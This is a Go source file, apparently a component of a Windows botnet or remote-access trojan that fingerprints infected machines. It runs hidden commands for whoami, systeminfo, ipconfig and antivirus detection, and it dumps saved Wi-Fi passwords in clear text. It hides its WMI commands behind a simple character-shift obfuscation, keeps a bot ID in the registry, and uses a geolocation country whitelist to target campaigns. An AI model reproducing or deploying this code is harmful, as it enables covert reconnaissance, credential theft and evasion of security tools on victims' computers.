package components

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unicode"

	"github.com/StackExchange/wmi"
	"golang.org/x/sys/windows/registry"
)

func loadInfo() {
	myIP = getIP()
	myUID = getUID()
	checkifAdmin()
}

func checkifAdmin() { //Checks if the bot has admin rights
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		setAdmin(false)
	} else {
		setAdmin(true)
	}
}

func getIP() string {
	for i := 0; i < len(checkIP); i++ {
		rsp, _ := http.Get(checkIP[i])
		if rsp.StatusCode == 200 {
			defer rsp.Body.Close()
			buf, _ := ioutil.ReadAll(rsp.Body)
			return string(bytes.TrimSpace(buf))
		}
	}
	return "127.0.0.1"
}

func getWifiList() string {
	List := exec.Command("cmd", "/C", "netsh wlan show profile name=* key=clear")
	List.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := List.Output()

	return string(History)
}

func getInstalledSoftware() string {
	var tmp string = ""
	var dst []Win32_Product
	q := wmi.CreateQuery(&dst, "")
	_ = wmi.Query(q, &dst)
	for _, v := range dst {
		tmp += *v.Name + "|"
	}
	return tmp
}

func getIPConfig() string {
	Info := exec.Command("cmd", "/C", "ipconfig")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return string(History)
}

func getOS() string {
	Info := exec.Command("cmd", "/C", "ver")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return stripSpaces(string(History))
}

func getWhoami() string {
	Info := exec.Command("cmd", "/C", "whoami")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return string(History)
}

func getSysInfo() string {
	Info := exec.Command("cmd", "/C", "systeminfo")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return string(History)
}

func getCPU() string {
	Info := exec.Command("cmd", "/C", deobfuscate("xnjd!dqv!hfu!obnf"))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return stripSpaces(strings.Replace(string(History), "Name", "", -1))
}

func getGPU() string {
	Info := exec.Command("cmd", "/C", deobfuscate("xnjd!qbui!xjo43`WjefpDpouspmmfs!hfu!obnf"))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return stripSpaces(strings.Replace(string(History), "Name", "", -1))
}

func getRunningPath() string {
	return os.Args[0]
}

func getAntiVirus() string {
	Info := exec.Command("cmd", "/C", deobfuscate("XNJD!0Opef;mpdbmiptu!0Obnftqbdf;]]sppu]TfdvsjuzDfoufs3!Qbui!BoujWjsvtQspevdu!Hfu!ejtqmbzObnf!0Gpsnbu;Mjtu"))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	if strings.Contains(string(History), "=") {
		AV := strings.Split(string(History), "=")
		return stripSpaces(string(AV[1]))
	} else {
		return stripSpaces(string(History))
	}
}

func getUID() string {
	for i := 0; i < len(registryNames); i++ {
		val, err := getRegistryKeyValue(registry.CURRENT_USER, "Software\\"+registryNames[i]+"\\", "ID")
		if err != nil { //Make new UUID
		} else {
			return deobfuscate(val)
		}
	}
	uuid, _ := newUUID()
	return uuid
}

func getInstallDate() string {
	val, err := getRegistryKeyValue(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "INSTALL")
	if err != nil {
		return myTime
	} else {
		return val
	}
}

func newUUID() (string, error) {
	uuid := make([]byte, 16)
	n, err := io.ReadFull(rand.Reader, uuid)
	if n != len(uuid) || err != nil {
		return "", err
	}
	uuid[8] = uuid[8]&^0xc0 | 0x80
	uuid[6] = uuid[6]&^0xf0 | 0x40
	return fmt.Sprintf("%x-%x-%x-%x-%x", uuid[0:4], uuid[4:6], uuid[6:8], uuid[8:10], uuid[10:]), nil
}

func maxMindWork(opt int) bool {
	var client = new(http.Client)
	q, _ := http.NewRequest("GET", maxMind, nil)
	q.Header.Set("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
	q.Header.Set("Referer", deobfuscate(`iuuqt;00xxx/nbynjoe/dpn0fo0mpdbuf.nz.jq.beesftt`))
	r, _ := client.Do(q)
	if r.StatusCode == 200 {
		defer r.Body.Close()
		buf, _ := ioutil.ReadAll(r.Body)
		var pro mMind
		if opt == 0 {
			_ = json.NewDecoder(strings.NewReader(string(bytes.TrimSpace(buf)))).Decode(&pro)
			for i := 0; i < len(campaignWhitelist); i++ {
				if strings.Contains(strings.ToUpper(pro.Country.Names.En), strings.ToUpper(campaignWhitelist[i])) {
					return true
				}
			}
		} else {
			return false
		}
	}
	return false
}

func stripSpaces(str string) string {
	return strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, str)
}
